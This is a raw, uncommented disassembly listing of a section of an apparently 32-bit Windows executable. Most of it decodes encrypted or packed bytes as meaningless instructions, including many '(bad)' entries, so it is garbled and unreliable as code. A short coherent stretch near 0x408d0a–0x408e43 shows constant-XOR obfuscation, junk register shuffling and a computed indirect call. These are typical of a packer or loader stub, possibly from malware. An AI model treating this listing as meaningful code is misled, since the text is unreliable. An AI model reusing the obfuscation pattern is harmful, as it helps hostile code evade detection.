  408ab8:	jae    0x408a9a
  408aba:	jns    0x408adf
  408abc:	mov    ebx,ebp
  408abe:	dec    edi
  408abf:	sub    BYTE PTR [ecx],0xe6
  408ac2:	mov    ah,0x7e
  408ac4:	std    
  408ac5:	xchg   ecx,eax
  408ac6:	pop    ss
  408ac7:	xlat   BYTE PTR ds:[ebx]
  408ac8:	enter  0x2be5,0x68
  408acc:	or     cl,BYTE PTR [ebx+0x5b]
  408acf:	mov    edi,0x8e27f5d6
  408ad4:	cld    
  408ad5:	xchg   eax,edx
  408ad7:	dec    ecx
  408ad8:	outs   dx,DWORD PTR ds:[esi]
  408ad9:	ror    DWORD PTR [ebp+0x26839004],0x8f
  408ae0:	lea    edi,[esp+edi*4+0x37]
  408ae4:	fs sbb al,0xe6
  408ae7:	ins    BYTE PTR es:[edi],dx
  408ae8:	and    edx,DWORD PTR ds:0xb27050b8
  408aee:	jmp    0xe38b5743
  408af3:	xchg   BYTE PTR [ecx+ecx*2],cl
  408af6:	jl     0x408b1b
  408af8:	pop    ds
  408af9:	xor    ebx,DWORD PTR [edx]
  408afb:	lods   al,BYTE PTR ds:[esi]
  408afc:	pusha  
  408afd:	dec    ebx
  408afe:	add    edi,esp
  408b00:	mov    ebp,0x81bbad42
  408b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b06:	das    
  408b07:	imul   ebp,DWORD PTR [eax],0xfa29e55a
  408b0d:	aaa    
  408b0e:	adc    dl,BYTE PTR [ebp-0x56590582]
  408b14:	xor    eax,DWORD PTR [edi-0x2a]
  408b17:	dec    ebx
  408b18:	dec    esi
  408b19:	fadd   DWORD PTR [edx+0x14]
  408b1c:	jge    0x408af8
  408b1e:	pop    ss
  408b1f:	cwde   
  408b20:	and    esi,DWORD PTR [edi+ecx*4+0x64]
  408b24:	jmp    FWORD PTR [edx-0x16cc5441]
  408b2a:	xchg   edi,eax
  408b2b:	(bad)  
  408b2c:	cmp    ebx,DWORD PTR [ebp+0x7c31e43d]
  408b32:	adc    eax,0x21819e1d
  408b37:	imul   edi,eax,0x7c
  408b3a:	leave  
  408b3b:	adc    eax,0xf81796e4
  408b40:	(bad)  
  408b41:	sahf   
  408b42:	data16 mov BYTE PTR [ebp+0x587177d9],bh
  408b49:	xlat   BYTE PTR ds:[ebx]
  408b4a:	dec    edx
  408b4b:	cld    
  408b4c:	mul    WORD PTR [edx]
  408b4f:	fsubr  DWORD PTR [edi]
  408b51:	pop    eax
  408b52:	push   edx
  408b53:	mov    ebp,0x1ad9c423
  408b58:	pop    es
  408b59:	xor    eax,0x9c5a3a91
  408b5e:	ror    eax,0x7
  408b61:	dec    edx
  408b62:	push   0xf8285550
  408b67:	mov    WORD PTR gs:[ecx],cs
  408b6a:	scas   al,BYTE PTR es:[edi]
  408b6b:	mov    ds:0x3deb4600,eax
  408b70:	inc    DWORD PTR ds:0x402fe29a
  408b76:	sub    BYTE PTR [eax-0x62],al
  408b79:	lea    esi,[edx-0x71]
  408b7c:	or     eax,0x61f64fda
  408b81:	or     eax,0x7e5c046
  408b86:	push   edx
  408b87:	fcom   QWORD PTR [ebp+0x449c007a]
  408b8d:	outs   dx,DWORD PTR ds:[esi]
  408b8e:	sti    
  408b8f:	stos   DWORD PTR es:[edi],eax
  408b90:	mov    edx,0x4c0ad44e
  408b95:	adc    DWORD PTR [edx],ebx
  408b97:	shr    DWORD PTR [eax+0x10],cl
  408b9a:	sbb    DWORD PTR [edx],ebx
  408b9c:	xchg   DWORD PTR [ebx+0x29568aa3],ebx
  408ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ba3:	and    eax,0x3674095c
  408ba8:	(bad)  
  408ba9:	adc    eax,0xb54d3eb8
  408bae:	xor    ebp,DWORD PTR [edi-0x17360558]
  408bb4:	sub    ebp,esp
  408bb6:	sti    
  408bb7:	sbb    eax,eax
  408bb9:	dec    edi
  408bba:	or     DWORD PTR [esi-0x72],eax
  408bbd:	xchg   ecx,eax
  408bbe:	xchg   BYTE PTR [ebx+0x6c],ch
  408bc1:	retf   
  408bc2:	mov    edi,0xe8f6d58a
  408bc7:	sub    BYTE PTR [ecx-0x3f],bh
  408bca:	and    al,0x51
  408bcc:	mov    ebp,0xa52aff8c
  408bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd3:	aas    
  408bd4:	test   eax,0x20da9aca
  408bd9:	aaa    
  408bda:	pusha  
  408bdb:	inc    edx
  408bdc:	cld    
  408bdd:	mov    dl,0x76
  408bdf:	or     al,0x53
  408be1:	daa    
  408be2:	lods   eax,DWORD PTR ds:[esi]
  408be3:	mov    ebp,0x1c429a5a
  408be8:	push   cs
  408be9:	je     0x408c17
  408beb:	and    eax,0x4e7e0775
  408bf0:	jecxz  0x408bd9
  408bf2:	(bad)  
  408bf3:	aaa    
  408bf4:	rcl    BYTE PTR [esi-0x5444c470],1
  408bfa:	mov    ebx,DWORD PTR [ebx]
  408bfc:	mov    ebp,0x2abc055b
  408c01:	mov    dh,0xf
  408c03:	push   ebp
  408c04:	cdq    
  408c05:	or     edx,DWORD PTR [edi]
  408c07:	lds    edx,FWORD PTR ds:0x14e3e90f
  408c0d:	mov    ds:0x8d16083c,al
  408c12:	xor    dl,BYTE PTR [ebx-0x490e9a9f]
  408c18:	sub    al,0xe9
  408c1a:	push   cs
  408c1b:	or     eax,ebp
  408c1d:	arpl   WORD PTR [edx+0x6d90194c],sp
  408c23:	rcl    DWORD PTR [eax+0x36a3e9ca],cl
  408c29:	inc    edi
  408c2a:	push   ss
  408c2b:	adc    BYTE PTR [eax],0xf5
  408c2e:	ja     0x408bde
  408c30:	pop    esi
  408c31:	loopne 0x408c75
  408c33:	xor    al,0xab
  408c35:	push   ecx
  408c36:	test   BYTE PTR [esi+0x5a274ab4],ch
  408c3c:	lock inc edx
  408c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3f:	mov    eax,ds:0x35979a04
  408c44:	inc    edi
  408c45:	repz scas eax,DWORD PTR es:[edi]
  408c47:	imul   edi,ebx,0x41a774f6
  408c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4e:	adc    BYTE PTR [edx-0x350097d1],0xdb
  408c55:	scas   eax,DWORD PTR es:[edi]
  408c56:	js     0x408cca
  408c58:	mov    eax,DWORD PTR [ecx]
  408c5a:	test   al,0xf5
  408c5c:	add    eax,0x36860f05
  408c61:	mov    ah,0x95
  408c63:	stos   DWORD PTR es:[edi],eax
  408c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c65:	push   edi
  408c66:	aad    0xd0
  408c68:	jo     0x408cd3
  408c6a:	lock xor BYTE PTR [edi],dh
  408c6d:	xor    esp,eax
  408c6f:	inc    esp
  408c70:	(bad)  
  408c71:	adc    ecx,ebx
  408c73:	int    0x86
  408c75:	sbb    ebp,eax
  408c77:	pop    ebp
  408c78:	lock or eax,0x62591619
  408c7e:	xor    BYTE PTR [eax+0x61],0x7
  408c82:	fwait
  408c83:	sub    bl,dh
  408c85:	cmc    
  408c86:	lock sbb eax,0x2dd68962
  408c8c:	fsub   QWORD PTR [eax+0x31]
  408c8f:	bound  ebx,QWORD PTR [ebx+ebx*8-0x65]
  408c93:	or     DWORD PTR ds:0xaf5c327f,esp
  408c99:	sbb    eax,0x7a0d7cf3
  408c9e:	mul    BYTE PTR [ecx]
  408ca0:	cld    
  408ca1:	push   0x7a66d5c5
  408ca6:	dec    esi
  408ca7:	or     BYTE PTR [eiz*2-0x1f64e873],cl
  408cae:	dec    edx
  408caf:	xchg   edi,eax
  408cb0:	repz hlt 
  408cb2:	jno    0x408c9a
  408cb4:	push   0x11
  408cb6:	dec    eax
  408cb7:	or     dh,BYTE PTR [ecx]
  408cb9:	fimul  DWORD PTR [edx]
  408cbb:	jb     0x408c92
  408cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cbe:	sub    al,0xef
  408cc0:	jg     0x408ce9
  408cc2:	mov    cl,0xa7
  408cc4:	mov    ebx,0xbb3d2f0
  408cc9:	js     0x408d04
  408ccb:	pop    edi
  408ccc:	ins    DWORD PTR es:[edi],dx
  408ccd:	cld    
  408cce:	fnstenv [ebp+0x1d]
  408cd1:	ret    0x3dc3
  408cd4:	or     ah,BYTE PTR [ecx+0x1470fa7f]
  408cda:	das    
  408cdb:	hlt    
  408cdc:	scas   al,BYTE PTR es:[edi]
  408cdd:	gs mov ebp,0x8e672230
  408ce3:	idiv   DWORD PTR [ecx]
  408ce5:	shr    DWORD PTR [esi+0x6c],1
  408ce8:	(bad)  
  408ce9:	jns    0x408d02
  408ceb:	daa    
  408cec:	pop    edx
  408ced:	jg     0x408cff
  408cef:	sub    esi,DWORD PTR [ebx+0x755edbf0]
  408cf5:	push   ss
  408cf6:	or     DWORD PTR ds:0xa9c7adc5,esp
  408cfc:	gs jo  0x408d17
  408cff:	aas    
  408d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d01:	inc    ebx
  408d02:	jmp    DWORD PTR [edi]
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ff71
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xb03327cf
  408e55:	ret    0xd773
  408e58:	mov    bl,BYTE PTR [ecx]
  408e5a:	bound  esp,QWORD PTR [edx+0x2b]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx+0x27]
  408e61:	cmp    bh,BYTE PTR ds:0x89e83918
  408e67:	fmulp  st(5),st
  408e69:	mov    dh,0x83
  408e6b:	mov    bh,0x22
  408e6d:	pop    eax
  408e6e:	fucomi st,st(6)
  408e70:	popf   
  408e71:	push   es
  408e72:	mov    edx,esi
  408e74:	xchg   esi,eax
  408e75:	(bad)  
  408e76:	dec    edi
  408e77:	mov    esi,ebx
  408e79:	idiv   BYTE PTR [ecx+0x2d]
  408e7c:	in     al,0x9e
  408e7e:	adc    eax,0xd30eb8d5
  408e83:	mov    ss,WORD PTR [edx+0x3e814504]
  408e89:	and    DWORD PTR [eax],0xbc4e00ad
  408e8f:	pop    ebx
  408e90:	into   
  408e91:	out    dx,al
  408e92:	icebp  
  408e93:	daa    
  408e94:	inc    edx
  408e95:	inc    ebp
  408e96:	iret   
  408e97:	test   BYTE PTR [ebx+edx*1+0x3f799d44],bl
  408e9e:	leave  
  408e9f:	mov    eax,ds:0x333d77ae
  408ea4:	sbb    edi,ecx
  408ea6:	mov    bl,0x2e
  408ea8:	inc    esp
  408ea9:	pop    esp
  408eaa:	sbb    al,0xb4
  408eac:	lock in al,0xe6
  408eaf:	xor    al,0x17
  408eb1:	out    dx,eax
  408eb2:	mov    esi,0xf6a2a8ef
  408eb7:	sub    DWORD PTR [eax-0x7ad60540],esi
  408ebd:	cli    
  408ebe:	adc    BYTE PTR [esi],bh
  408ec0:	inc    ebx
  408ec1:	fs fwait
  408ec3:	retf   0xf467
  408ec6:	in     eax,dx
  408ec7:	loopne 0x408f2a
  408ec9:	das    
  408eca:	out    dx,eax
  408ecb:	sbb    al,0x59
  408ecd:	bound  edi,QWORD PTR [ebx]
  408ecf:	jnp    0x408f1c
  408ed1:	std    
  408ed2:	xchg   edx,eax
  408ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed4:	sbb    dl,BYTE PTR [ebp+0x1de35d14]
  408eda:	scas   eax,DWORD PTR es:[edi]
  408edb:	enter  0x5733,0x37
  408edf:	imul   edi,edx,0x3b
  408ee2:	daa    
  408ee3:	lahf   
  408ee4:	stos   DWORD PTR es:[edi],eax
  408ee5:	pusha  
  408ee6:	or     DWORD PTR [ebp-0x22],eax
  408ee9:	jg     0x408e7c
  408eeb:	test   BYTE PTR [ecx+0x5e],dh
  408eee:	hlt    
  408eef:	sub    BYTE PTR ds:0x8ca22264,0xdf
  408ef6:	xchg   ebx,eax
  408ef7:	aad    0xdb
  408ef9:	jmp    0xfe37afde
  408efe:	or     edi,0x74
  408f01:	jbe    0x408ee9
  408f03:	ins    BYTE PTR es:[edi],dx
  408f04:	stos   BYTE PTR es:[edi],al
  408f05:	arpl   WORD PTR [edx-0x6b826c0c],bx
  408f0b:	fs jae 0x408ed0
  408f0e:	outs   dx,BYTE PTR ds:[esi]
  408f0f:	repnz mov al,ds:0x3b1fcd28
  408f15:	sti    
  408f16:	lock inc ebx
  408f18:	cli    
  408f19:	enter  0x98a8,0x19
  408f1d:	mov    DWORD PTR ds:0x56f280d7,esi
  408f23:	pop    ds
  408f24:	out    dx,eax
  408f25:	cwde   
  408f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f27:	dec    ebx
  408f28:	inc    ebx
  408f29:	pop    ebp
  408f2a:	mov    eax,ss
  408f2c:	mov    cl,0x6b
  408f2e:	mov    WORD PTR [ebp-0x5c00cb15],?
  408f34:	mov    eax,ds:0xc589ad50
  408f39:	das    
  408f3a:	and    eax,0x401f411b
  408f3f:	mov    dl,0x33
  408f41:	cli    
  408f42:	xor    DWORD PTR [edx-0x6e58d4c8],edi
  408f48:	mov    bh,0x69
  408f4a:	je     0x408f24
  408f4c:	pop    esp
  408f4d:	rcr    al,0x35
  408f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f51:	adc    BYTE PTR ds:0x8bf514e5,dh
  408f57:	push   edi
  408f58:	push   esi
  408f59:	int    0xf8
  408f5b:	in     al,dx
  408f5c:	pushf  
  408f5d:	cmp    BYTE PTR [ebp-0x76],bl
  408f60:	xor    DWORD PTR [ecx+0x42],edx
  408f63:	mov    ah,0x1e
  408f65:	inc    ebp
  408f66:	out    0x85,al
  408f68:	ins    BYTE PTR es:[edi],dx
  408f69:	sar    DWORD PTR ds:0x121589ae,1
  408f6f:	fisttp DWORD PTR [eax]
  408f71:	das    
  408f72:	out    0x4e,eax
  408f74:	xchg   esi,eax
  408f75:	pop    esp
  408f76:	adc    bh,dh
  408f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f79:	or     BYTE PTR ds:0xdc25ab20,0xdd
  408f80:	and    al,0xb6
  408f82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f83:	mov    ecx,0x806bc1e
  408f88:	sub    BYTE PTR [edi-0xf7be124],bl
  408f8e:	mov    esp,DWORD PTR [edi]
  408f90:	lock push esi
  408f92:	dec    ebp
  408f93:	sbb    al,0xf8
  408f95:	jle    0x408fa7
  408f97:	dec    edi
  408f98:	or     esi,DWORD PTR [edi+0x4e]
  408f9b:	sbb    al,0x5b
  408f9d:	jmp    0xecabb42b
  408fa2:	add    eax,0x27aed48a
  408fa7:	(bad)  
  408fa8:	imul   ecx,eax,0x1ce6ff28
  408fae:	idiv   edx
  408fb0:	adc    ebx,DWORD PTR [ebp-0x41ac6b23]
  408fb6:	cmp    DWORD PTR es:[edx+0x7caaf53d],esi
  408fbd:	retf   
  408fbe:	pop    esi
  408fbf:	sub    eax,0x5609632c
  408fc4:	inc    eax
  408fc5:	sub    al,0x7
  408fc7:	aas    
  408fc8:	xor    ch,bl
  408fca:	test   ch,0xa5
  408fcd:	pusha  
  408fce:	dec    esi
  408fcf:	(bad)  
  408fd1:	outs   dx,DWORD PTR ds:[esi]
  408fd2:	sbb    BYTE PTR [edx+0x67],al
  408fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fd6:	sub    dh,BYTE PTR [edi-0x45d5a647]
  408fdc:	ret    
  408fdd:	push   es
  408fde:	sar    eax,0xc2
  408fe1:	push   cs
  408fe2:	xor    ebp,DWORD PTR [edx+0x1ee9a42a]
  408fe8:	or     eax,0x5e7af9df
  408fed:	pop    eax
  408fee:	into   
  408fef:	ds ja  0x408fb8
  408ff2:	in     eax,0x47
  408ff4:	xor    al,0xdb
  408ff6:	xchg   BYTE PTR [eax+0x65],bh
  408ff9:	mov    eax,ds:0x4eb30b3e
  408ffe:	cld    
  408fff:	xchg   edi,eax
  409000:	pop    edx
  409001:	cmp    DWORD PTR [ebp-0x2be5121e],ebx
  409007:	mov    ah,0x96
  409009:	add    DWORD PTR [edi],0x42
  40900c:	mov    bh,0xa8
  40900e:	icebp  
  40900f:	lods   eax,DWORD PTR ds:[esi]
  409010:	data16 adc BYTE PTR [ebx+0x5c],al
  409014:	je     0x409010
  409016:	outs   dx,BYTE PTR ds:[esi]
  409017:	stos   BYTE PTR es:[edi],al
  409018:	sar    DWORD PTR [ebp+0x13],1
  40901b:	inc    ebp
  40901c:	mov    bh,0x5
  40901e:	sbb    al,0x6d
  409020:	xor    eax,DWORD PTR [eax]
  409022:	sbb    DWORD PTR [ecx+esi*1+0x63],0xd2cf5ded
  40902a:	mov    esp,0x1da79729
  40902f:	pop    esp
  409030:	mov    eax,0xc6a70542
  409035:	rol    DWORD PTR [edi+edx*8-0x6dda7e79],1
  40903c:	inc    edi
  40903d:	rcl    BYTE PTR [ecx],0x9c
  409040:	or     DWORD PTR [esi],esi
  409042:	mov    ebp,db3
  409045:	jae    0x40904e
  409047:	mov    al,0x8c
  409049:	push   ds
  40904a:	ror    DWORD PTR [ecx+0xe827129],cl
  409050:	imul   BYTE PTR [esi-0x20ca1f84]
  409056:	nop
  409057:	iret   
  409058:	je     0x409099
  40905a:	(bad)  
  40905b:	push   ebp
  40905c:	inc    ecx
  40905d:	or     BYTE PTR [ebp+0x3f],dl
  409060:	mov    ah,BYTE PTR [edx]
  409062:	sbb    dl,BYTE PTR [ecx+0x1e]
  409065:	mov    ds:0xb72858a9,al
  40906a:	out    0xd,al
  40906c:	adc    BYTE PTR [esi+eax*4],dh
  40906f:	mov    BYTE PTR [esi],bl
  409071:	leave  
  409072:	outs   dx,DWORD PTR ds:[esi]
  409073:	out    0x26,eax
  409075:	push   0x76489664
  40907a:	cmp    DWORD PTR [ecx-0x7b8b6cfd],ebx
  409080:	inc    ecx
  409081:	cmp    BYTE PTR [ebp+edi*2+0x32d7eeb7],0x75
  409089:	or     dl,BYTE PTR [edi]
  40908b:	call   FWORD PTR [ebx+eiz*2+0x32]
  40908f:	arpl   WORD PTR [ebp-0xa],bx
  409092:	cld    
  409093:	fwait
  409094:	ja     0x4090c2
  409096:	and    DWORD PTR [edi-0x64],ebp
  409099:	ss jmp 0x3e846c54
  40909f:	pop    esi
  4090a0:	push   0xffffffa9
  4090a2:	jbe    0x4090f4
  4090a4:	adc    eax,0xe5284216
  4090a9:	mov    ah,ah
  4090ab:	loope  0x4090b3
  4090ad:	les    edx,FWORD PTR [ebx]
  4090af:	inc    ecx
  4090b0:	pop    ds
  4090b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b2:	shl    DWORD PTR [ecx+0x4dd49772],cl
  4090b8:	lods   eax,DWORD PTR ds:[esi]
  4090b9:	push   esp
  4090ba:	js     0x40911c
  4090bc:	mov    esi,0x6c888f5b
  4090c1:	inc    esp
  4090c2:	cmp    BYTE PTR [ebx+0xb9a5a33],bl
  4090c8:	adc    bh,dh
  4090ca:	sti    
  4090cb:	mov    esp,0xd9214ec2
  4090d0:	xchg   DWORD PTR [edx+edi*4-0x35],ecx
  4090d4:	jno    0x409109
  4090d6:	or     esp,edx
  4090d8:	sahf   
  4090d9:	or     ch,BYTE PTR [ebp+0x5e]
  4090dc:	push   ds
  4090dd:	jmp    0x6cc86899
  4090e2:	les    esi,FWORD PTR [ebx-0x1f]
  4090e5:	adc    BYTE PTR [esi+0x21],bh
  4090e8:	ins    BYTE PTR es:[edi],dx
  4090e9:	jo     0x409144
  4090eb:	or     esi,DWORD PTR [esi+eax*2]
  4090ee:	sbb    al,0xf4
  4090f0:	(bad)  
  4090f1:	stos   DWORD PTR es:[edi],eax
  4090f2:	inc    ebp
  4090f3:	(bad)  [ebp+0x7e1e864]
  4090fa:	in     al,dx
  4090fb:	xchg   esp,eax
  4090fc:	and    eax,0x9c2f94e9
  409101:	mov    ebx,?
  409103:	cmp    DWORD PTR [ecx+eax*2-0x117201c1],esp
  40910a:	sbb    BYTE PTR [esi],ch
  40910c:	into   
  40910d:	jecxz  0x40913b
  40910f:	aad    0x68
  409111:	push   cs
  409112:	sbb    eax,0x3d06fced
  409117:	shl    esp,0x71
  40911a:	jno    0x4090a1
  40911c:	daa    
  40911d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40911e:	pop    ecx
  40911f:	sbb    ecx,DWORD PTR [ebx+edi*4]
  409122:	inc    ebx
  409123:	push   eax
  409124:	aaa    
  409125:	call   0xf973:0x37b4d9f7
  40912c:	mov    edi,0x88941cfd
  409131:	jmp    0x26e6:0xf15e1020
  409138:	xchg   esi,eax
  409139:	mov    ah,0x23
  40913b:	dec    edi
  40913c:	in     al,0x18
  40913e:	fidivr WORD PTR [edi]
  409140:	sub    eax,0x1cc6a3fb
  409145:	aas    
  409146:	mov    esi,ecx
  409148:	fisub  DWORD PTR [edx+edx*8-0x40]
  40914c:	sub    esp,DWORD PTR [edx+0x6f601e12]
  409152:	mov    WORD PTR [edi+0x6a],es
  409155:	in     al,dx
  409156:	lock mov esi,0xc39b9edd
  40915c:	adc    eax,0x216c4342
  409161:	sub    BYTE PTR [ecx+0x6163312d],ah
  409167:	ds (bad) 
  409169:	push   ss
  40916a:	fsubr  st,st(1)
  40916d:	xor    BYTE PTR [ecx+0x5b],dl
  409170:	mov    al,0x87
  409172:	sbb    eax,0x938cfea
  409177:	lock jecxz 0x409141
  40917a:	xor    edi,DWORD PTR [esi-0x20]
  40917d:	inc    eax
  40917e:	shr    DWORD PTR [esi],0x86
  409181:	sbb    ax,0xee49
  409185:	cs into 
  409187:	rcr    esi,0x2c
  40918a:	call   0x92251369
  40918f:	mov    edi,0xa63af166
  409194:	xor    al,0xb2
  409196:	sub    eax,0xc5f8bb87
  40919b:	bts    DWORD PTR [eax],ebp
  40919e:	retf   
  40919f:	pop    es
  4091a0:	mov    esi,0x17ac4864
  4091a5:	and    DWORD PTR [edi-0x15],ebx
  4091a8:	in     eax,dx
  4091a9:	pop    es
  4091aa:	and    al,0x17
  4091ac:	xchg   esp,eax
  4091ad:	bound  ecx,QWORD PTR [edx]
  4091af:	fisub  WORD PTR [edi-0x18]
  4091b2:	lods   eax,DWORD PTR ds:[esi]
  4091b3:	imul   edx,DWORD PTR [ebx],0x95b15f0e
  4091b9:	cmp    ecx,esp
  4091bb:	shl    BYTE PTR [ecx+0x4faaeee3],cl
  4091c1:	add    eax,0xdc377309
  4091c6:	cmp    al,0xb9
  4091c8:	dec    ebx
  4091c9:	call   0x9392:0x8a4ad2e3
  4091d0:	inc    eax
  4091d1:	push   edx
  4091d2:	sbb    ecx,esi
  4091d4:	leave  
  4091d5:	test   cl,cl
  4091d7:	push   es
  4091d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d9:	or     dl,BYTE PTR [edi+0x15af5e16]
  4091df:	push   ebx
  4091e0:	std    
  4091e1:	mov    edi,gs
  4091e3:	ror    BYTE PTR [eax-0x30],cl
  4091e6:	shr    BYTE PTR [edx-0xe],0xfc
  4091ea:	stos   DWORD PTR es:[edi],eax
  4091eb:	and    esi,DWORD PTR [ebp+0x58]
  4091ee:	jnp    0x40925b
  4091f0:	pop    esp
  4091f1:	stos   DWORD PTR es:[edi],eax
  4091f2:	push   esi
  4091f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091f4:	in     eax,dx
  4091f5:	stc    
  4091f6:	push   0x20f9378e
  4091fb:	imul   esp,DWORD PTR [esi-0x1276704b],0xdb178398
  409205:	sbb    cl,bl
  409207:	mov    esp,0x3db5d618
  40920c:	rcr    edx,0x9f
  40920f:	(bad)  
  409210:	addr16 xchg ecx,eax
  409212:	cmp    al,cl
  409214:	push   ebp
  409215:	add    cl,BYTE PTR [esi]
  409217:	xor    al,0xd6
  409219:	xchg   ebp,eax
  40921a:	inc    DWORD PTR [eax]
  40921c:	mov    ecx,0xa67f7245
  409221:	ficomp DWORD PTR [ebp+0x727dd91b]
  409227:	imul   eax,DWORD PTR [eax+0x12d68ac9],0x4f
  40922e:	push   ebx
  40922f:	sbb    cl,bh
  409231:	adc    BYTE PTR [ebx-0x11],ch
  409234:	jbe    0x4091cf
  409236:	mov    al,ds:0xd8f86b47
  40923b:	imul   ebx,DWORD PTR [eax+0x141dd2f1],0x189fee6e
  409245:	(bad)
  409249:	mov    bl,0x30
  40924b:	fucomip st,st(7)
  40924d:	and    dh,BYTE PTR [ebx-0x6c06e3ce]
  409253:	mov    edi,0x5ac40a22
  409258:	stc    
  409259:	jl     0x4091eb
  40925b:	icebp  
  40925c:	mov    edx,0xa611f250
  409261:	in     al,0x50
  409263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409264:	or     al,0xe9
  409266:	into   
  409267:	jecxz  0x4092b9
  409269:	sbb    ecx,ecx
  40926b:	bound  ebx,QWORD PTR [ecx]
  40926d:	scas   eax,DWORD PTR es:[edi]
  40926e:	pop    esi
  40926f:	out    dx,eax
  409270:	xchg   bh,bl
  409272:	cld    
  409273:	sub    BYTE PTR [esi+0x47451111],ah
  409279:	push   ebp
  40927a:	lea    ebx,[edx+0x6e]
  40927d:	popf   
  40927e:	jg     0x409214
  409280:	sub    DWORD PTR [ebp-0x11],esi
  409283:	xchg   edi,eax
  409284:	adc    al,0x2e
  409286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409287:	iret   
  409288:	dec    edx
  409289:	sar    cl,1
  40928b:	js     0x40926a
  40928d:	mov    dh,0x56
  40928f:	mov    ebp,0x9abf69ec
  409294:	pop    ebp
  409295:	adc    cl,BYTE PTR [esp+esi*4+0x64]
